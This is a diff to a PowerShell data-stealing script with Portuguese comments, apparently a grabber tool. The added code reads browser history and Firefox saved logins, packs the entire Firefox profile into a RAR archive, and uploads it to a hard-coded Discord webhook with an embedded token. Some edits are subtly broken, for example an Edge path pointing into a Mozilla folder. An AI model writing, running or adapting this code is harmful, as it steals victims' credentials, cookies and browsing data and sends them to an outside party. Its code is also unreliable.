@@ -37,7 +37,7 @@
 #                                                                                                                                                          #
 #  Gitub: ClankPT                                                                                                                                          #
 #  Discord: .clank_                                                                                                                                        #
-#  Steam: Clank.PT                                                                                                                                         #                                                                                                                                 #
+#  Steam: Clank.PT                                                                                                                                         #                                                                                                                                 
 ############################################################################################################################################################
 
 $i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
@@ -332,7 +332,7 @@ $output = @"
 #                                     |    ##             ##   ##  ##   ##            ##  ##   ##  ##  ##   ##  ##  ###   ## ##   |                        #
 #                                     |  ######           ##   ##  ### ###             ####   #######  ##   ##  ##   ##  ### ###  |                        #
 #                                                                                                                                                          #
-#                                                              Anything can be hacked... or anyone                                                         #                                                 #
+#                                                              Anything can be hacked... or anyone                                                         #                                                 
 #                                                                                                                                                          # 
 #__________________________________________________________________________________________________________________________________________________________#
 
@@ -477,28 +477,27 @@ $drivers
 $output > $env:TEMP\$FolderName/computerData.txt
 
 ############################################################################################################################################################
+# Dados dos Browsers
 function Get-BrowserData {
 
     [CmdletBinding()]
     param (	
-        [Parameter (Position=1,Mandatory = $True)]
-        [string]$Browser,    
-        [Parameter (Position=1,Mandatory = $True)]
-        [string]$DataType 
+    [Parameter (Position=1,Mandatory = $True)]
+    [string]$Browser,    
+    [Parameter (Position=1,Mandatory = $True)]
+    [string]$DataType 
     ) 
 
     $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
 
     if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
     elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
-    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data\Default\History"}
-    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE\Appdata\Local\Microsoft\Edge\User Data\Default\Bookmarks"}
+    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
+    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE\AppData\Local\Mozilla\Edge\User Data\Default\Bookmarks"}
     elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release-*\places.sqlite"}
-    elseif ($Browser -eq 'firefox' -and $DataType -eq 'logins'    )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release-*\logins.json"}
-    elseif ($Browser -eq 'brave'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"}
-    elseif ($Browser -eq 'brave'   -and $DataType -eq 'logins'    )  {$Path = "$Env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"}
+    elseif ($Browser -eq 'firefox' -and $DataType -eq 'logindata')  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release-*\logins.json"}
 
-    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} | Sort -Unique
+    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
     $Value | ForEach-Object {
         $Key = $_
         if ($Key -match $Search){
@@ -512,21 +511,51 @@ function Get-BrowserData {
     } 
 }
 
-Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+# Função para compactar a pasta do perfil do Firefox em um arquivo RAR
+function Compress-FirefoxProfile {
+    $sourceFolder = "C:\Users\$env:UserName\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release-*"
+    $destinationPath = "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\Perfil_Firefox.rar"
+    & "C:\Program Files\WinRAR\Rar.exe" a -r -ep1 -inul $destinationPath $sourceFolder
+}
 
-Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+# Função para enviar o arquivo RAR para um webhook do Discord
+function Upload-RARToDiscord {
+    $filePath = "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\Perfil_Firefox.rar"
+    $hookUrl = "https://discord.com/api/webhooks/1185172334592655371/r9YAVpnfPK_W5z5D4F0WmkdFO6j7Vo7kSofgED4Ntol0ht1z_ZSMTZkJD7KcdoP30J1V"
 
-Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+    $headers = @{
+        "Content-Type" = "multipart/form-data"
+    }
+    
+    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
+    $fileContent = [System.Convert]::ToBase64String($fileBytes)
 
-Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+    $body = @{
+        "file" = @{
+            "value" = $fileContent
+            "options" = @{
+                "filename" = "Perfil_Firefox.rar"
+            }
+        }
+    }
 
-Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+    Invoke-RestMethod -Uri $hookUrl -Method Post -Headers $headers -Body ($body | ConvertTo-Json)
+}
 
-Get-BrowserData -Browser "firefox" -DataType "logins" >> $env:TMP\$FolderName\BrowserData.txt
+# Extrair dados do Brave
+Get-BrowserData -Browser "brave" -DataType "history" >> $env:TMP\BrowserData.txt
+Get-BrowserData -Browser "brave" -DataType "logindata" >> $env:TMP\BrowserData.txt
 
-Get-BrowserData -Browser "brave" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+# Extrair dados do Firefox
+Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\BrowserData.txt
+Get-BrowserData -Browser "firefox" -DataType "logindata" >> $env:TMP\BrowserData.txt
 
-Get-BrowserData -Browser "brave" -DataType "logins" >> $env:TMP\$FolderName\BrowserData.txt
+# Comprimir a pasta do perfil do Firefox em um arquivo RAR
+Compress-FirefoxProfile
+
+# Enviar o arquivo RAR para o Discord
+Upload-RARToDiscord
+
 
 ############################################################################################################################################################
 
